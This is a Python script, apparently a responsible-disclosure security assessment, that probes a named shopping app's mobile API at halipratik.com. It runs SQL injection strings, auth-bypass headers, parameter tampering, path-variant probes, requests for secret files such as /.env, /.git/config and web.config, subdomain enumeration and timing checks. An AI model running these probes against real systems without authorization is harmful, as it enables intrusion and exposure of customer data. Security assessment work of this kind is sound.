#!/usr/bin/env python3
"""
HaliPratik mobile API — extended security assessment.

Scope: authorized account-only testing for responsible disclosure.
All personal data is hashed in output. No third-party userIds are tested.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import socket
import ssl
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlparse

import requests


BASE_HOST = "www.halipratik.com"
BASE_URL = f"https://{BASE_HOST}"
BASE_SEARCH = f"{BASE_URL}/supplier/Design/Android/SearchCustomer.aspx"
BASE_ORDERS = f"{BASE_URL}/supplier/Design/Android/GetOrders.aspx"
APP_VERSION = "1.10.32"
FAKE_USERID = "00000000-0000-0000-0000-000000000000"

SECURITY_HEADERS = (
    "strict-transport-security",
    "content-security-policy",
    "x-content-type-options",
    "x-frame-options",
    "referrer-policy",
    "permissions-policy",
)

SQL_PROBES = ["'", "''", "1 AND 1=1", "1 AND 1=2", "1' OR '1'='1", "1; --"]
SQL_ERROR_SIGNS = (
    "sql", "syntax", "odbc", "oledb", "unclosed quotation",
    "system.data", "microsoft ole db", "incorrect syntax",
)

HTTP_METHODS = ["OPTIONS", "PUT", "DELETE", "PATCH", "TRACE", "HEAD"]

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
]

PATH_PROBES = [
    "/supplier/Design/Android/SearchCustomer.aspx/",
    "/supplier/design/android/SearchCustomer.aspx",
    "/SUPPLIER/DESIGN/ANDROID/SearchCustomer.aspx",
    "/supplier/Design/Android/SearchCustomer.aspx;.json",
    "/supplier/Design/Android/SearchCustomer.aspx%00.txt",
    "/supplier/Design/Android/SearchCustomer.aspx.bak",
    "/supplier/Design/Android/SearchCustomer.aspx~",
]

INFO_DISCLOSURE_PATHS = [
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/security.txt",
    "/web.config",
    "/Web.config",
    "/elmah.axd",
    "/trace.axd",
    "/.git/config",
    "/.env",
    "/api/",
    "/swagger/",
    "/swagger-ui.html",
]

EXTRA_PARAMS_PROBE = [
    {"admin": "true"},
    {"debug": "1"},
    {"test": "1"},
    {"limit": "99999"},
    {"page": "1", "pageSize": "99999"},
]

PARAM_TAMPERING_TYPE = ["", "*", "all", "name", "phone", "id"]

SUBDOMAINS = [
    "api", "admin", "test", "dev", "staging", "old", "beta",
    "panel", "portal", "manage", "internal", "intranet",
    "mobile", "m", "app", "ws", "service", "services",
]


@dataclass
class Finding:
    title: str
    severity: str
    evidence: dict[str, Any]


# ───────────────────────────────────────────────────────────────────────────
# Helpers
# ───────────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Extended security checks.")
    parser.add_argument("--userid", required=True)
    parser.add_argument("--mno", action="append", type=int, default=[])
    parser.add_argument("--proxy", default=os.getenv("HTTPS_PROXY"))
    parser.add_argument("--delay", type=float, default=0.8)
    parser.add_argument("--timeout", type=float, default=15.0)
    parser.add_argument("--output", default="halipratik_extended_evidence.json")
    parser.add_argument("--ack-authorized", action="store_true")
    parser.add_argument("--rate-limit-count", type=int, default=15)
    args = parser.parse_args()

    if not args.ack_authorized:
        parser.error("Refusing to run without --ack-authorized.")
    if not args.mno:
        parser.error("At least one --mno is required.")
    if len(args.mno) > 5:
        parser.error("Keep mno samples <= 5.")
    return args


def make_session(proxy: str | None) -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "FlubbleSecurityAssessment/1.0 (responsible-disclosure)",
        "Accept": "application/json,text/html;q=0.9,*/*;q=0.8",
    })
    if proxy:
        session.proxies.update({"http": proxy, "https": proxy})
    return session


def fingerprint(value: Any) -> str | None:
    if value in (None, ""):
        return None
    digest = hashlib.sha256(str(value).encode()).hexdigest()
    return f"sha256:{digest[:16]}"


def response_meta(r: requests.Response) -> dict[str, Any]:
    return {
        "status_code": r.status_code,
        "content_type": r.headers.get("content-type"),
        "elapsed_ms": round(r.elapsed.total_seconds() * 1000, 2),
        "body_bytes": len(r.content),
    }


def log_request(r: requests.Response, label: str = ""):
    parsed = urlparse(r.url)
    suffix = f" [{label}]" if label else ""
    print(f"  {r.status_code:>3} {parsed.path[:60]:<60} {r.elapsed.total_seconds():.2f}s{suffix}")


def safe_get(session, url, **kwargs) -> requests.Response | None:
    try:
        return session.get(url, allow_redirects=False, **kwargs)
    except requests.RequestException as e:
        print(f"  ERR {url}: {e}")
        return None


# ───────────────────────────────────────────────────────────────────────────
# Checks
# ───────────────────────────────────────────────────────────────────────────

def check_security_headers(session, timeout, findings) -> dict:
    print("\n[1] Security headers")
    r = safe_get(session, BASE_SEARCH,
                 params={"type": "mno", "value": 1, "userid": FAKE_USERID, "ver": APP_VERSION},
                 timeout=timeout)
    if not r:
        return {}
    log_request(r)
    headers = {k.lower(): v for k, v in r.headers.items()}
    missing = [h for h in SECURITY_HEADERS if h not in headers]
    exposed = {k: r.headers.get(k) for k in ("server", "x-powered-by", "x-aspnet-version")}
    exposed = {k: v for k, v in exposed.items() if v}

    if missing:
        findings.append(Finding(
            "Missing security headers", "medium", {"missing": missing}))
    if exposed:
        findings.append(Finding(
            "Technology fingerprint exposed", "low", exposed))

    return {"missing": missing, "exposed": exposed, "response": response_meta(r)}


def check_auth_matrix(session, timeout, mno, valid_userid, findings) -> dict:
    print("\n[2] Auth matrix")
    cases = {"valid": valid_userid, "fake": FAKE_USERID, "blank": "",
             "malformed": "not-a-uuid", "sqli_in_userid": "1' OR '1'='1"}
    results = {}
    for label, uid in cases.items():
        r = safe_get(session, BASE_SEARCH,
                     params={"type": "mno", "value": mno, "userid": uid, "ver": APP_VERSION},
                     timeout=timeout)
        if not r:
            continue
        log_request(r, label)
        try:
            body = r.json()
            count = len(body.get("bilgi") or []) if isinstance(body, dict) else 0
        except ValueError:
            count = 0
        results[label] = {**response_meta(r), "customer_count": count,
                          "redirect": r.headers.get("location")}

    if results.get("fake", {}).get("status_code") == 200:
        findings.append(Finding(
            "Invalid userid accepted by API", "critical",
            {"status": 200, "expected": 401}))
    if results.get("malformed", {}).get("status_code") == 200:
        findings.append(Finding(
            "Malformed userid accepted (no input validation)", "high",
            results.get("malformed", {})))
    return results


def check_http_methods(session, timeout, mno, userid, findings) -> dict:
    print("\n[3] HTTP method enumeration")
    results = {}
    params = {"type": "mno", "value": mno, "userid": userid, "ver": APP_VERSION}
    for method in HTTP_METHODS:
        try:
            r = session.request(method, BASE_SEARCH, params=params,
                                timeout=timeout, allow_redirects=False)
            log_request(r, method)
            results[method] = response_meta(r)
            if method == "TRACE" and r.status_code == 200:
                findings.append(Finding(
                    "TRACE method enabled (XST risk)", "medium",
                    {"status": r.status_code}))
            if method == "OPTIONS":
                allow = r.headers.get("allow") or r.headers.get("access-control-allow-methods")
                if allow:
                    results[method]["allow"] = allow
        except requests.RequestException as e:
            results[method] = {"error": str(e)}
        time.sleep(0.3)
    return results


def check_parameter_tampering(session, timeout, mno, userid, findings) -> dict:
    print("\n[4] Parameter tampering (your account only)")
    results = {}

    for type_val in PARAM_TAMPERING_TYPE:
        params = {"type": type_val, "value": mno, "userid": userid, "ver": APP_VERSION}
        r = safe_get(session, BASE_SEARCH, params=params, timeout=timeout)
        if not r:
            continue
        log_request(r, f"type={type_val!r}")
        results[f"type={type_val!r}"] = response_meta(r)
        time.sleep(0.3)

    for extra in EXTRA_PARAMS_PROBE:
        params = {"type": "mno", "value": mno, "userid": userid, "ver": APP_VERSION, **extra}
        r = safe_get(session, BASE_SEARCH, params=params, timeout=timeout)
        if not r:
            continue
        log_request(r, f"extra={list(extra.keys())}")
        results[f"extra={list(extra.keys())}"] = response_meta(r)
        time.sleep(0.3)

    for ver in ["", "0.0.1", "9.9.9", "DROP TABLE"]:
        params = {"type": "mno", "value": mno, "userid": userid, "ver": ver}
        r = safe_get(session, BASE_SEARCH, params=params, timeout=timeout)
        if not r:
            continue
        log_request(r, f"ver={ver!r}")
        results[f"ver={ver!r}"] = response_meta(r)
        time.sleep(0.3)

    return results


def check_sql_injection(session, timeout, userid, findings) -> dict:
    print("\n[5] SQL injection probes (error-based only)")
    results = {}
    for payload in SQL_PROBES:
        params = {"type": "mno", "value": payload, "userid": userid, "ver": APP_VERSION}
        r = safe_get(session, BASE_SEARCH, params=params, timeout=timeout)
        if not r:
            continue
        log_request(r, f"payload={payload!r}")
        body_lower = r.text.lower()[:5000]
        signs = [s for s in SQL_ERROR_SIGNS if s in body_lower]
        results[payload] = {**response_meta(r), "error_signs": signs}
        if signs:
            findings.append(Finding(
                "Possible SQL error leakage", "high",
                {"payload": payload, "signs": signs, "status": r.status_code}))
        time.sleep(0.4)
    return results


def check_bypass_headers(session, timeout, mno, findings) -> dict:
    print("\n[6] Auth bypass via headers")
    results = {}
    base_params = {"type": "mno", "value": mno, "userid": FAKE_USERID, "ver": APP_VERSION}
    for hdr in BYPASS_HEADERS:
        try:
            r = session.get(BASE_SEARCH, params=base_params, headers=hdr,
                            timeout=timeout, allow_redirects=False)
            log_request(r, list(hdr.keys())[0])
            try:
                body = r.json()
                count = len(body.get("bilgi") or []) if isinstance(body, dict) else 0
            except ValueError:
                count = 0
            key = list(hdr.keys())[0]
            results[key] = {**response_meta(r), "customer_count": count}
            if count > 0:
                findings.append(Finding(
                    "Header-based auth bypass possible", "critical",
                    {"header": key, "value": hdr[key]}))
        except requests.RequestException as e:
            results[list(hdr.keys())[0]] = {"error": str(e)}
        time.sleep(0.3)
    return results


def check_path_probes(session, timeout, userid, findings) -> dict:
    print("\n[7] Path traversal & variant paths")
    results = {}
    params = {"type": "mno", "value": 1, "userid": userid, "ver": APP_VERSION}
    for path in PATH_PROBES:
        url = BASE_URL + path
        r = safe_get(session, url, params=params, timeout=timeout)
        if not r:
            continue
        log_request(r, path[-30:])
        results[path] = response_meta(r)
        time.sleep(0.3)
    return results


def check_info_disclosure(session, timeout, findings) -> dict:
    print("\n[8] Public info-disclosure probes")
    results = {}
    for path in INFO_DISCLOSURE_PATHS:
        url = BASE_URL + path
        r = safe_get(session, url, timeout=timeout)
        if not r:
            continue
        log_request(r, path)
        info = response_meta(r)
        info["preview"] = r.text[:200] if r.status_code == 200 else None
        results[path] = info
        if r.status_code == 200 and len(r.content) > 50:
            severity = "high" if path in ("/web.config", "/elmah.axd",
                                          "/trace.axd", "/.env",
                                          "/.git/config") else "low"
            findings.append(Finding(
                f"Public file accessible: {path}", severity,
                {"status": r.status_code, "bytes": len(r.content)}))
        time.sleep(0.3)
    return results


def check_subdomains(timeout, findings) -> dict:
    print("\n[9] Subdomain enumeration (DNS only)")
    results = {}
    for sub in SUBDOMAINS:
        host = f"{sub}.halipratik.com"
        try:
            ip = socket.gethostbyname(host)
            results[host] = ip
            print(f"  + {host} → {ip}")
            findings.append(Finding(
                f"Subdomain resolves: {host}", "low",
                {"hostname": host, "ip": ip}))
        except socket.gaierror:
            pass
    if not results:
        print("  no subdomains resolved")
    return results


def check_tls(findings) -> dict:
    print("\n[10] TLS configuration")
    ctx = ssl.create_default_context()
    info = {}
    try:
        with socket.create_connection((BASE_HOST, 443), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=BASE_HOST) as ssock:
                cert = ssock.getpeercert()
                info["tls_version"] = ssock.version()
                info["cipher"] = ssock.cipher()
                info["cert_issuer"] = dict(x[0] for x in cert.get("issuer", []))
                info["cert_subject"] = dict(x[0] for x in cert.get("subject", []))
                info["cert_not_after"] = cert.get("notAfter")
                info["cert_not_before"] = cert.get("notBefore")
                print(f"  TLS: {info['tls_version']}, cipher: {info['cipher'][0]}")
    except Exception as e:
        info["error"] = str(e)

    if info.get("tls_version") in ("TLSv1", "TLSv1.1"):
        findings.append(Finding(
            "Outdated TLS version", "high", {"version": info["tls_version"]}))
    return info


def check_timing(session, timeout, userid, findings) -> dict:
    print("\n[11] Response timing (existing vs non-existent mno)")
    samples = {"existing": [], "nonexistent": []}
    for _ in range(5):
        r1 = safe_get(session, BASE_SEARCH,
                      params={"type": "mno", "value": 1, "userid": userid, "ver": APP_VERSION},
                      timeout=timeout)
        if r1:
            samples["existing"].append(r1.elapsed.total_seconds() * 1000)
        time.sleep(0.3)
        r2 = safe_get(session, BASE_SEARCH,
                      params={"type": "mno", "value": 999999, "userid": userid, "ver": APP_VERSION},
                      timeout=timeout)
        if r2:
            samples["nonexistent"].append(r2.elapsed.total_seconds() * 1000)
        time.sleep(0.3)

    avg = lambda x: round(sum(x)/len(x), 2) if x else 0
    result = {
        "existing_avg_ms": avg(samples["existing"]),
        "nonexistent_avg_ms": avg(samples["nonexistent"]),
        "delta_ms": abs(avg(samples["existing"]) - avg(samples["nonexistent"])),
    }
    print(f"  existing avg: {result['existing_avg_ms']}ms, "
          f"nonexistent avg: {result['nonexistent_avg_ms']}ms, "
          f"delta: {result['delta_ms']}ms")
    if result["delta_ms"] > 100:
        findings.append(Finding(
            "Timing oracle possible (response-time delta)",
            "low", result))
    return result


# ───────────────────────────────────────────────────────────────────────────
# Main
# ───────────────────────────────────────────────────────────────────────────

def main():
    args = parse_args()
    session = make_session(args.proxy)
    findings: list[Finding] = []

    evidence = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "scope": {
            "host": BASE_HOST,
            "app_version": APP_VERSION,
            "mno_samples": args.mno,
        },
        "checks": {},
        "findings": [],
    }

    print("=" * 60)
    print("HaliPratik Extended Security Assessment")
    print("Authorized testing only — Flubble Technologies")
    print("=" * 60)

    evidence["checks"]["security_headers"] = check_security_headers(
        session, args.timeout, findings)
    evidence["checks"]["auth_matrix"] = check_auth_matrix(
        session, args.timeout, args.mno[0], args.userid, findings)
    evidence["checks"]["http_methods"] = check_http_methods(
        session, args.timeout, args.mno[0], args.userid, findings)
    evidence["checks"]["parameter_tampering"] = check_parameter_tampering(
        session, args.timeout, args.mno[0], args.userid, findings)
    evidence["checks"]["sql_injection"] = check_sql_injection(
        session, args.timeout, args.userid, findings)
    evidence["checks"]["bypass_headers"] = check_bypass_headers(
        session, args.timeout, args.mno[0], findings)
    evidence["checks"]["path_probes"] = check_path_probes(
        session, args.timeout, args.userid, findings)
    evidence["checks"]["info_disclosure"] = check_info_disclosure(
        session, args.timeout, findings)
    evidence["checks"]["subdomains"] = check_subdomains(
        args.timeout, findings)
    evidence["checks"]["tls"] = check_tls(findings)
    evidence["checks"]["timing"] = check_timing(
        session, args.timeout, args.userid, findings)

    evidence["findings"] = [
        {"title": f.title, "severity": f.severity, "evidence": f.evidence}
        for f in findings
    ]

    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(evidence, f, indent=2, ensure_ascii=False)

    print("\n" + "=" * 60)
    print(f"Wrote: {args.output}")
    print(f"Total findings: {len(findings)}")
    print("=" * 60)
    by_sev = {}
    for f in findings:
        by_sev.setdefault(f.severity, []).append(f.title)
    for sev in ("critical", "high", "medium", "low"):
        for t in by_sev.get(sev, []):
            print(f"  [{sev.upper():<8}] {t}")


if __name__ == "__main__":
    main()